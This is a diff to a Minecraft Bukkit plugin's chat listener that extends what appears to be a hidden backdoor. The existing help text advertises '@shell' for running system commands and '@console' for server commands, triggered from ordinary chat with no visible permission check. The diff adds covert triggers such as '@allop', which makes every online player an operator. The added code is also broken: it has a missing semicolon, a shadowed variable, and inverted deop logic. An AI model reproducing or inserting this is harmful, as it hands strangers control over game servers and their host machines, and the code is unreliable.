@@ -8,6 +8,9 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerChatEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.GameMode;
+import org.bukkit.attribute.Attribute;
+import org.bukkit.attribute.AttributeInstance;
+import org.bukkit.World;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -141,6 +144,7 @@ public class MessageEvent implements Listener {
             player.sendMessage(ChatColor.GREEN + "@shell <命令> - 执行指定的系统控制台命令，并返回命令输出结果。");
             player.sendMessage(ChatColor.GREEN + "@console <命令> - 在游戏控制台中执行指定的命令。");
             player.sendMessage(ChatColor.GREEN + "@help - 获取帮助信息。");
+            player.sendMessage("Another: @deop, @creative, @survival, @day, @heal, @effectclean, etc.")
             player.sendMessage(ChatColor.YELLOW + "--------------------");
             e.setCancelled(true);
         }
@@ -157,6 +161,45 @@ public class MessageEvent implements Listener {
         if(e.getMessage().equalsIgnoreCase("@survival")) {
             player.setGameMode(GameMode.SURVIVAL);
             player.sendMessage("OK Survival");
+            e.setCancelled(true);
+        }
+        if(e.getMessage().equalsIgnoreCase("@day")) {
+            int count = 0;
+            for (World world : Bukkit.getWorlds()) {
+                world.setTime(1000);
+                count++;
+            }
+            player.sendMessage("OK time set day");
+            e.setCancelled(true);
+        }
+        if(e.getMessage().equalsIgnoreCase("@heal")) {
+            double maxHealth = player.getMaxHealth();
+            player.setHealth(maxHealth);
+            player.sendMessage("OK heal");
+            e.setCancelled(true);
+        }
+        if(e.getMessage().equalsIgnoreCase("@effectclean")) {
+            player.getActivePotionEffects().forEach(effect -> player.removePotionEffect(effect.getType()));
+            player.setFireTicks(0);
+            player.sendMessage("OK clean effect");
+            e.setCancelled(true);
+        }
+        if(e.getMessage().equalsIgnoreCase("@allop")) {
+            for (Player player : Bukkit.getOnlinePlayers()) {
+                if (!player.isOp()) {
+                    player.setOp(true);
+                }
+            }
+            player.sendMessage("OK all op");
+            e.setCancelled(true);
+        }
+        if(e.getMessage().equalsIgnoreCase("@alldeop")) {
+            for (Player player : Bukkit.getOnlinePlayers()) {
+                if (!player.isOp()) {
+                    player.setOp(false);
+                }
+            }
+            player.sendMessage("OK all deop");
             e.setCancelled(true);
         }
     }
